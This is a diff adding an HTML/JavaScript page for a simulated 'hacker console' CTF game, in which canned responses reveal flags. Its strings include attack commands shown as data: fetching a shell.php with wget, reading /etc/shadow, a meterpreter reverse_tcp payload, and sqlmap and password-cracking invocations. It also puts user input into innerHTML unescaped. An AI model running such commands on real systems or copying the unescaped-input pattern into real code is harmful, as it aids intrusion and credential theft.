@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<!--
+EDUCATIONAL CTF CHALLENGE - SIMULATED HACKING ENVIRONMENT
+This is a Capture The Flag (CTF) cybersecurity training exercise.
+All commands and tools are simulated for educational purposes.
+No real hacking capabilities - CTF challenge only.
+-->
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HACKER CONSOLE - CTF CHALLENGE</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="console-container">
+        <div class="console-header">
+            <div class="header-left">
+                <span class="console-title">HACKER CONSOLE v3.7.2</span>
+                <span class="connection-status">CONNECTED</span>
+            </div>
+            <div class="header-right">
+                <span class="timestamp" id="timestamp"></span>
+                <div class="system-load">
+                    <span>CPU: <span id="cpu-load">67%</span></span>
+                    <span>MEM: <span id="mem-load">42%</span></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="console-body">
+            <div class="terminal-section">
+                <div class="terminal-output" id="terminal-output">
+                    <div class="output-line">
+                        <span class="prompt">root@darknet:~#</span>
+                        <span class="command">whoami</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="result">elite_hacker</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="prompt">root@darknet:~#</span>
+                        <span class="command">ls -la</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="result">total 42</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="result">drwxr-xr-x 5 root root 4096 Oct 2 14:30 .</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="result">drwxr-xr-x 3 root root 4096 Oct 1 09:15 ..</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="result">-rw------- 1 root root 256 Oct 2 14:25 .bash_history</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="result">-rwxr-xr-x 1 root root 8192 Oct 2 14:30 exploit.py</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="result">drwx------ 2 root root 4096 Oct 2 14:20 .ssh</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="result">-rw-r--r-- 1 root root 42 Oct 2 14:15 target_list.txt</span>
+                    </div>
+                    <div class="output-line">
+                        <span class="result">drwxr-xr-x 3 root root 4096 Oct 2 14:10 tools</span>
+                    </div>
+                </div>
+
+                <div class="command-input">
+                    <span class="prompt">root@darknet:~#</span>
+                    <input type="text" id="command-line" placeholder="Enter command..." autocomplete="off">
+                </div>
+            </div>
+        </div>
+
+        <div class="console-sidebar">
+            <div class="tool-panel">
+                <h3>HACKING TOOLS</h3>
+                <div class="tool-list">
+                    <div class="tool-item" onclick="runTool('nmap')">
+                        <span class="tool-name">NMAP</span>
+                        <span class="tool-desc">Network Scanner</span>
+                    </div>
+                    <div class="tool-item" onclick="runTool('metasploit')">
+                        <span class="tool-name">METASPLOIT</span>
+                        <span class="tool-desc">Exploit Framework</span>
+                    </div>
+                    <div class="tool-item" onclick="runTool('wireshark')">
+                        <span class="tool-name">WIRESHARK</span>
+                        <span class="tool-desc">Packet Analyzer</span>
+                    </div>
+                    <div class="tool-item" onclick="runTool('john')">
+                        <span class="tool-name">JOHN</span>
+                        <span class="tool-desc">Password Cracker</span>
+                    </div>
+                    <div class="tool-item" onclick="runTool('sqlmap')">
+                        <span class="tool-name">SQLMAP</span>
+                        <span class="tool-desc">SQL Injection</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="target-panel">
+                <h3>TARGET SYSTEMS</h3>
+                <div class="target-list">
+                    <div class="target-item">
+                        <span class="target-ip">192.168.1.100</span>
+                        <span class="target-status vulnerable">VULNERABLE</span>
+                    </div>
+                    <div class="target-item">
+                        <span class="target-ip">10.0.0.50</span>
+                        <span class="target-status secure">SECURE</span>
+                    </div>
+                    <div class="target-item">
+                        <span class="target-ip">172.16.0.25</span>
+                        <span class="target-status unknown">SCANNING</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="console-navigation">
+            <a href="exploits.html" class="console-nav-btn">EXPLOIT DATABASE</a>
+            <a href="payloads.html" class="console-nav-btn">PAYLOAD GENERATOR</a>
+        </div>
+    </div>
+
+    <script>
+        const commands = {
+            'help': 'Available commands: help, ls, cat, cd, pwd, whoami, ps, netstat, history, clear, exploit, scan',
+            'ls': 'exploit.py  target_list.txt  tools/  .ssh/  .bash_history',
+            'pwd': '/root',
+            'whoami': 'elite_hacker',
+            'ps': 'PID  COMMAND\n1337 exploit.py\n2048 nmap_scan\n4096 metasploit',
+            'netstat': 'Active connections:\nTCP 192.168.1.100:4444 ESTABLISHED\nTCP 10.0.0.50:22 TIME_WAIT',
+            'history': 'nmap -sS 192.168.1.0/24\nmsfconsole\nexploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp',
+            'cat target_list.txt': '192.168.1.100 - Windows Server 2019\n10.0.0.50 - Ubuntu 20.04\n172.16.0.25 - CentOS 7',
+            'cat .bash_history': 'ssh root@target.com\nwget http://exploit-db.com/shell.php\nchmod +x exploit.py\n./exploit.py --target 192.168.1.100',
+            'exploit': 'Starting exploit framework...\nLoading payloads...\nExploit ready. Use "exploit --help" for options.',
+            'exploit --help': 'Usage: exploit [OPTIONS] TARGET\n--payload PAYLOAD  Set payload type\n--port PORT       Set listening port\n--stealth         Enable stealth mode',
+            'scan': 'Starting network scan...\nDiscovered hosts:\n192.168.1.100 (Windows)\n10.0.0.50 (Linux)\n172.16.0.25 (Unknown)',
+            'clear': 'CLEAR_SCREEN'
+        };
+
+        const secretCommands = {
+            'cat /etc/shadow': 'root:$6$randomsalt$hashedpassword:18500:0:99999:7:::\nCTF{shadow_file_accessed}',
+            'find / -name "*.flag"': '/root/.hidden/flag1.txt\n/var/log/.flag2\n/tmp/.secret_flag\nCTF{filesystem_enumeration}',
+            'sudo -l': 'User elite_hacker may run the following commands:\n(ALL) NOPASSWD: /bin/bash\nCTF{privilege_escalation_possible}'
+        };
+
+        document.getElementById('command-line').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                executeCommand(this.value);
+                this.value = '';
+            }
+        });
+
+        function executeCommand(cmd) {
+            const output = document.getElementById('terminal-output');
+
+            // Add command to output
+            const commandLine = document.createElement('div');
+            commandLine.className = 'output-line';
+            commandLine.innerHTML = `<span class="prompt">root@darknet:~#</span> <span class="command">${cmd}</span>`;
+            output.appendChild(commandLine);
+
+            // Process command
+            let result = '';
+            if (secretCommands[cmd]) {
+                result = secretCommands[cmd];
+            } else if (commands[cmd]) {
+                result = commands[cmd];
+            } else if (cmd.startsWith('exploit --payload')) {
+                result = 'Payload loaded successfully.\nListening on port 4444...\nWaiting for connection...';
+            } else if (cmd.includes('flag') || cmd.includes('CTF')) {
+                result = 'Access denied. Insufficient privileges.';
+            } else if (cmd === 'clear') {
+                output.innerHTML = '';
+                return;
+            } else {
+                result = `bash: ${cmd}: command not found`;
+            }
+
+            // Add result to output
+            if (result !== 'CLEAR_SCREEN') {
+                const resultLines = result.split('\n');
+                resultLines.forEach(line => {
+                    const resultLine = document.createElement('div');
+                    resultLine.className = 'output-line';
+                    if (line.includes('CTF{')) {
+                        resultLine.innerHTML = `<span class="result flag-result">${line}</span>`;
+                    } else {
+                        resultLine.innerHTML = `<span class="result">${line}</span>`;
+                    }
+                    output.appendChild(resultLine);
+                });
+            }
+
+            // Scroll to bottom
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function runTool(toolName) {
+            const toolCommands = {
+                'nmap': 'nmap -sS -O 192.168.1.0/24',
+                'metasploit': 'msfconsole',
+                'wireshark': 'wireshark -i eth0',
+                'john': 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
+                'sqlmap': 'sqlmap -u "http://target.com/login.php" --dbs'
+            };
+
+            if (toolCommands[toolName]) {
+                document.getElementById('command-line').value = toolCommands[toolName];
+            }
+        }
+
+        // Update timestamp and system stats
+        function updateStats() {
+            document.getElementById('timestamp').textContent = new Date().toLocaleTimeString();
+            document.getElementById('cpu-load').textContent = Math.floor(Math.random() * 30 + 50) + '%';
+            document.getElementById('mem-load').textContent = Math.floor(Math.random() * 20 + 35) + '%';
+        }
+
+        setInterval(updateStats, 1000);
+        updateStats();
+
+        // Focus on command input
+        document.getElementById('command-line').focus();
+    </script>
+</body>
+
+</html>
